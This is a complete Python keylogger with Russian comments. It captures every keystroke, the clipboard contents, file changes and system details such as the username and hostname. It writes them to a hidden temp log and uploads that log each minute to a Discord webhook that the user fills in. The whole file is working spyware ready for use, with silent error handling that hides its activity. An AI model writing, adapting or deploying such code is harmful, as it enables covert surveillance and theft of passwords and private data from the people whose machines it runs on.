import os
import sys
import platform
import datetime
import getpass
import socket
import threading
import time
import requests
import json
import base64
from pathlib import Path

# ⚙️ НАСТРОЙКИ - ЗАПОЛНИ ОБЯЗАТЕЛЬНО ⚙️
WEBHOOK_URL = "https://discord.com/api/webhooks/ТВОЙ_АЙДИ/ТВОЙ_ТОКЕН"  # <-- СЮДА WEBHOOK
# ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️ ⚙️

LOG_FILE = os.path.join(os.environ.get("TEMP", "."), "logs.txt")

def send_to_discord(content, filepath=None):
    try:
        if filepath and os.path.exists(filepath):
            with open(filepath, "rb") as f:
                files = {"file": (os.path.basename(filepath), f)}
                requests.post(WEBHOOK_URL, files=files, data={"content": content})
        else:
            data = {"content": content[:2000]}
            requests.post(WEBHOOK_URL, json=data)
    except:
        pass

def get_system_info():
    info = {
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "user": getpass.getuser(),
        "hostname": socket.gethostname(),
        "os": platform.system() + " " + platform.release(),
        "python": sys.version,
        "cwd": os.getcwd()
    }
    return info

def log_event(event_type, description=""):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] [{event_type}] {description}\n")

def periodic_send():
    last_size = 0
    while True:
        time.sleep(60)
        if os.path.exists(LOG_FILE):
            current_size = os.path.getsize(LOG_FILE)
            if current_size > last_size:
                send_to_discord("📁 Лог обновлен", LOG_FILE)
                last_size = current_size

def monitor_keyboard():
    try:
        from pynput import keyboard
        def on_press(key):
            try:
                log_event("KEY", f"Нажата клавиша: {key.char}")
            except AttributeError:
                log_event("KEY", f"Спецклавиша: {key}")
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except ImportError:
        log_event("ERROR", "pynput не установлен")

def monitor_clipboard():
    try:
        import pyperclip
        last = ""
        while True:
            current = pyperclip.paste()
            if current != last and current.strip():
                log_event("CLIPBOARD", current[:500])
                last = current
            time.sleep(2)
    except ImportError:
        log_event("ERROR", "pyperclip не установлен")

def monitor_files(directory="."):
    tracked = set(os.listdir(directory))
    while True:
        current = set(os.listdir(directory))
        new = current - tracked
        removed = tracked - current
        for f in new:
            log_event("FILE_NEW", f"Создан: {f}")
        for f in removed:
            log_event("FILE_DEL", f"Удален: {f}")
        tracked = current
        time.sleep(5)

def main():
    log_event("SESSION_START", "Сессия логирования начата")
    
    info = get_system_info()
    for key, value in info.items():
        log_event("SYSINFO", f"{key}: {value}")
    
    send_to_discord("🟢 **Логгер запущен**\n```" + json.dumps(info, indent=2) + "```", LOG_FILE)
    
    threading.Thread(target=periodic_send, daemon=True).start()
    threading.Thread(target=monitor_keyboard, daemon=True).start()
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    threading.Thread(target=monitor_files, daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log_event("SESSION_END", "Сессия логирования завершена")
        send_to_discord("🔴 **Логгер остановлен**", LOG_FILE)

if __name__ == "__main__":
    main()